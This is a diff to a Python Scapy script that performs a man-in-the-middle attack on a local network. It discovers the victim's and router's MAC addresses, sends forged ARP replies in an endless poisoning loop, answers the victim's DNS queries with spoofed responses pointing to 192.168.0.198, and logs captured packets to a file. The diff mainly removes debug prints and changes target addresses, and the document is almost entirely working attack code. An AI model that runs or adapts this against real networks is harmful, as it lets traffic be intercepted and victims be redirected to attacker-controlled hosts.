@@ -11,7 +11,7 @@ def mac_addr_discovery():
 
     ## Discovering MAC Address of Victim Machine and Router
 
-    print('Figuring Out Mac Address of Victim Machine with IP address 192.168.0.203')
+    print('Figuring Out Mac Address of Victim Machine with IP address 192.168.0.208')
     broadcast1 = Ether(dst = 'ff:ff:ff:ff:ff:ff')
     arp_layer1 = ARP(pdst = victim_ip_addr)
     entire_packet1 = broadcast1 / arp_layer1
@@ -29,50 +29,35 @@ def mac_addr_discovery():
     router_mac_addr = answer2[0][1].hwsrc
     return victim_mac_addr, router_mac_addr
 
+
 def poison(victim_pkt, router_pkt):
     print("Starting ARP poisoning loop...")
     while True:
 
-        print('corruping victim')
         send(victim_pkt, verbose = False, iface = "enp0s3")
         
         time.sleep(2)
 
-        print('corrupting router')
         send(router_pkt, verbose = False, iface = "enp0s3")
+
 
 def packet_listener(packet):
     scapy_packet = IP(packet.get_payload() )
-    #print(scapy_packet)
-
-    if (scapy_packet.haslayer(TCP)):
-        tcp_layer = scapy_packet[TCP]
-        print(tcp_layer)
 
     if (scapy_packet.haslayer(DNS) and scapy_packet[DNS].qr == 0):
-        print('DNS RESPONSE')
-        dns_response = scapy_packet[DNS]
-        print('-----------------------------')
-        print('DNS ID', dns_response.id)
-        print('DNS QR', dns_response.qr)
-        print('DNS QNAME', dns_response.qd.qname)
 
+        dns_response = scapy_packet[DNS]
         query_id = dns_response.id
         qname = dns_response.qd.qname
         qd = dns_response.qd
-
         sport = scapy_packet[UDP].sport
-
-
-
+       
         dns_layer = DNS(id = query_id, qr = 1, aa = 1, ancount = 1,
                         qd = qd,
-                        an = DNSRR(rrname = qname, ttl = 20, rdata = '157.240.8.35'))
+                        an = DNSRR(rrname = qname, ttl = 20, rdata = '192.168.0.198'))
 
 
         new_packet = IP(dst=victim_ip_addr, src = router_ip_addr) / UDP(sport = 53, dport = sport) / dns_layer
-
-        #print('NEW PACKET', new_packet)
 
         del new_packet[IP].len 
         del new_packet[IP].chksum 
@@ -88,7 +73,6 @@ def packet_listener(packet):
 
 
 
-
 def packet_sniff(victim_mac_addr, router_mac_addr, attacker_mac_addr):
 
     def filterPkt(pkt):
@@ -100,6 +84,7 @@ def packet_sniff(victim_mac_addr, router_mac_addr, attacker_mac_addr):
         )
 
     def process_pkt(pkt):
+        print(pkt.summary())
         with open('file.txt', 'a') as file:
             file.write(pkt.show(dump=True))
             file.write('\n----\n')
@@ -120,6 +105,8 @@ def main():
     print(f"Victim MAC: {victim_mac_addr}")
     print(f"Router MAC: {router_mac_addr}")
     print(f"Attacker MAC: {attacker_mac_addr}")
+
+    print(f"Victim IP addr {victim_ip_addr}")
 
     victim_pkt = ARP(op=2, hwdst = victim_mac_addr, pdst= victim_ip_addr, psrc= router_ip_addr)
     router_pkt = ARP(op=2, hwdst = router_mac_addr, pdst=router_ip_addr, psrc= victim_ip_addr)
